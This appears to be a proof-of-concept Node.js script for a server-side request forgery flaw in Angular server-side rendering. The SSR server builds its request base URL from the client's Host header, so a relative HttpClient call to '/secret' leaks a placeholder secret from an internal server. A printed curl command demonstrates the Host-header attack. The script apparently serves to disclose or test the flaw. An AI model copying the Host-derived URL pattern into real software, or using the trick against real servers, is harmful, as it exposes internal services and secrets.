var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
import '@angular/compiler';
import 'zone.js/node';
import http from 'node:http';
import { HttpClient, HttpClientModule } from '@angular/common/http';
import { APP_INITIALIZER, Component, NgModule } from '@angular/core';
import { BrowserModule } from '@angular/platform-browser';
import { INITIAL_CONFIG, renderModule, ServerModule } from '@angular/platform-server';
import { firstValueFrom } from 'rxjs';
const INTERNAL_PORT = 4401;
const SSR_PORT = 4400;
const INTERNAL_SECRET = 'INTERNAL_SECRET_123';
let secretValue = 'unset';
let AppComponent = class AppComponent {
    secret = secretValue;
};
AppComponent = __decorate([
    Component({
        selector: 'app',
        template: `<div id="secret">{{secret}}</div>`,
        standalone: false,
    })
], AppComponent);
let AppServerModule = class AppServerModule {
};
AppServerModule = __decorate([
    NgModule({
        imports: [BrowserModule, ServerModule, HttpClientModule],
        declarations: [AppComponent],
        bootstrap: [AppComponent],
        providers: [
            {
                provide: APP_INITIALIZER,
                multi: true,
                deps: [HttpClient],
                useFactory: (http) => async () => {
                    secretValue = await firstValueFrom(http.get('/secret', { responseType: 'text' }));
                },
            },
        ],
    })
], AppServerModule);
function startInternalServer() {
    const server = http.createServer((req, res) => {
        if (req.url === '/secret') {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(INTERNAL_SECRET);
            return;
        }
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('not found');
    });
    server.listen(INTERNAL_PORT, '127.0.0.1');
    return server;
}
function startSsrServer() {
    const server = http.createServer(async (req, res) => {
        const hostHeader = req.headers.host || `127.0.0.1:${SSR_PORT}`;
        const reqUrl = req.url || '/';
        const url = `http://${hostHeader}${reqUrl}`;
        try {
            const html = await renderModule(AppServerModule, {
                document: '<app></app>',
                url,
                extraProviders: [
                    {
                        provide: INITIAL_CONFIG,
                        useValue: { document: '<app></app>', url },
                    },
                ],
            });
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(html);
        }
        catch (err) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end(String(err));
        }
    });
    server.listen(SSR_PORT, '127.0.0.1');
    return server;
}
function main() {
    startInternalServer();
    startSsrServer();
    // eslint-disable-next-line no-console
    console.log(`Internal server: http://127.0.0.1:${INTERNAL_PORT}/secret`);
    // eslint-disable-next-line no-console
    console.log(`SSR server:      http://127.0.0.1:${SSR_PORT}/`);
    // eslint-disable-next-line no-console
    console.log(`Attack demo: curl -H 'Host: 127.0.0.1:${INTERNAL_PORT}' http://127.0.0.1:${SSR_PORT}/`);
}
main();
